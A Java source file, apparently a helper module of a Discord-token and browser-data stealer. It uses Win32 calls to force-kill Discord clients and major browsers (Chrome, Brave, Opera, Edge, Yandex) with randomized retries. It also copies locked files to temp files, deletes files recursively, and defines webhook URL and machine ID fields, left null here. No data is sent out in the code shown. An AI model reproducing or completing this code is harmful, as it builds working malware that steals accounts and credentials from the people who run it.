import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.Tlhelp32;
import com.sun.jna.platform.win32.WinDef;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.nio.file.attribute.FileAttribute;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class ProcessKiller {

    public static final ExecutorService executor = Executors.newCachedThreadPool();

    public static final String webhookUrl;

    public static final String machineId;

    private static final Set<String> discordProcessNames;
    private static final Set<String> browserProcessNames;

    private static boolean silent;

    public static String normalizePath(String path) {
        if (path == null) return null;
        try {

            char[] buffer = new char[32768];
            int len = NtDllWrapper.getLongPathName(path, buffer, buffer.length);
            if (len > 0) return new String(buffer, 0, len);
        } catch (Throwable ignored) {}
        return path;
    }

    public static void killProcesses(Set<String> processNames) {
        for (int attempt = 0; attempt < 3; attempt++) {
            int killed = 0;
            WinDef.HANDLE snapshot = Kernel32.INSTANCE.CreateToolhelp32Snapshot(
                Tlhelp32.TH32CS_SNAPPROCESS, new WinDef.DWORD(0)
            );
            if (snapshot == null) break;

            try {
                Tlhelp32.PROCESSENTRY32.ByReference entry = new Tlhelp32.PROCESSENTRY32.ByReference();
                if (!Kernel32.INSTANCE.Process32First(snapshot, entry)) break;

                do {
                    String exeName = new String(entry.szExeFile).toLowerCase();
                    if (!processNames.contains(exeName)) continue;

                    int pid = entry.th32ProcessID.intValue();
                    if (pid == Kernel32.INSTANCE.GetCurrentProcessId()) continue;

                    WinDef.HANDLE process = Kernel32.INSTANCE.OpenProcess(1, false, pid);
                    if (process == null) continue;

                    boolean terminated = Kernel32.INSTANCE.TerminateProcess(process, 0);
                    Kernel32.INSTANCE.CloseHandle(process);
                    if (terminated) killed++;

                } while (Kernel32.INSTANCE.Process32Next(snapshot, entry));

            } finally {
                Kernel32.INSTANCE.CloseHandle(snapshot);
            }

            if (killed == 0) break;

            randomSleep(500, 1500);
        }
    }

    public static void killDiscord() {
        killProcesses(discordProcessNames);
    }

    public static void killBrowsers() {
        killProcesses(browserProcessNames);
    }

    public static void randomSleep(long minMs, long maxMs) {
        try {
            long duration = minMs + (long)(Math.random() * (maxMs - minMs));
            Thread.sleep(duration);
        } catch (Exception ignored) {}
    }

    public static File copyToTemp(File source) throws IOException {
        File temp = Files.createTempFile("tmp_", ".tmp", new FileAttribute[0]).toFile();
        temp.deleteOnExit();

        for (int i = 0; i < 5; i++) {
            try {
                Files.copy(source.toPath(), temp.toPath(), StandardCopyOption.REPLACE_EXISTING);
                return temp;
            } catch (IOException e) {
                if (i == 4) throw e;
                try { Thread.sleep(200); } catch (Exception ignored) {}
            }
        }
        return temp;
    }

    public static void deleteRecursive(File file) {
        if (file == null || !file.exists()) return;
        if (file.isDirectory()) {
            File[] children = file.listFiles();
            if (children != null) {
                for (File child : children) deleteRecursive(child);
            }
        }
        if (!file.delete()) file.deleteOnExit();
    }

    static {

        discordProcessNames = new java.util.HashSet<>();
        discordProcessNames.add("discord.exe");
        discordProcessNames.add("discordcanary.exe");
        discordProcessNames.add("discordptb.exe");
        discordProcessNames.add("discorddev.exe");

        browserProcessNames = new java.util.HashSet<>();
        browserProcessNames.add("chrome.exe");
        browserProcessNames.add("brave.exe");
        browserProcessNames.add("opera.exe");
        browserProcessNames.add("msedge.exe");
        browserProcessNames.add("yandexbrowser.exe");

        webhookUrl = null;
        machineId = null;
    }
}